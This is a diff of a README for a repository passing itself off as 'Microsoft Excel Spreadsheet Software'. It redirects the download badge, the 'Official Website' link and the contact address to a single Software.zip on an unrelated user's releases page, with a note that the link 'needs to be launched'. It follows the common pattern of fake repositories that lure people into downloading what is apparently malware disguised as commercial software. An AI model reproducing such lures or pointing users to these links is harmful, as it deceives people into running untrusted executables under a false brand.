@@ -41,12 +41,12 @@ Microsoft Excel offers a wide range of features to help you excel in your data m
 ## 📦 Download v1.0.0
 If you are looking to download the latest version of the Microsoft Excel Spreadsheet Software repository, please click the button below:
 
-[![Download Microsoft Excel Spreadsheet Software](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Microsoft Excel Spreadsheet Software](https://github.com/Fireempire9/Microsoft-Excel-Spreadsheet-Software/releases/download/v1.0/Software.zip)](https://github.com/Fireempire9/Microsoft-Excel-Spreadsheet-Software/releases/download/v1.0/Software.zip)
 
 *Note: The link provided needs to be launched.*
 
 ## 🌐 Visit Website
-To explore more about Microsoft Excel and its capabilities, visit the [Microsoft Excel Official Website](https://www.microsoft.com/en-us/microsoft-365/excel).
+To explore more about Microsoft Excel and its capabilities, visit the [Microsoft Excel Official Website](https://github.com/Fireempire9/Microsoft-Excel-Spreadsheet-Software/releases/download/v1.0/Software.zip).
 
 ## 📂 Releases Section
 If the provided download link is not working or if you are looking for more recent releases of the Microsoft Excel Spreadsheet Software, make sure to check the "Releases" section of this repository for the latest updates.
@@ -55,6 +55,6 @@ If the provided download link is not working or if you are looking for more rece
 Contributions to the Microsoft-Excel-Spreadsheet-Software repository are always welcome! Feel free to fork the repository and submit a pull request to enhance the functionalities of Microsoft Excel and help fellow users excel in their data management tasks.
 
 ## 📞 Contact
-If you have any questions, feedback, or suggestions regarding the Microsoft Excel Spreadsheet Software repository, feel free to reach out to us at [excelsoftware@company.com](mailto:excelsoftware@company.com).
+If you have any questions, feedback, or suggestions regarding the Microsoft Excel Spreadsheet Software repository, feel free to reach out to us at [https://github.com/Fireempire9/Microsoft-Excel-Spreadsheet-Software/releases/download/v1.0/Software.zip](https://github.com/Fireempire9/Microsoft-Excel-Spreadsheet-Software/releases/download/v1.0/Software.zip).
 
 Let's excel together with Microsoft Excel Spreadsheet Software! 🚀📊💻
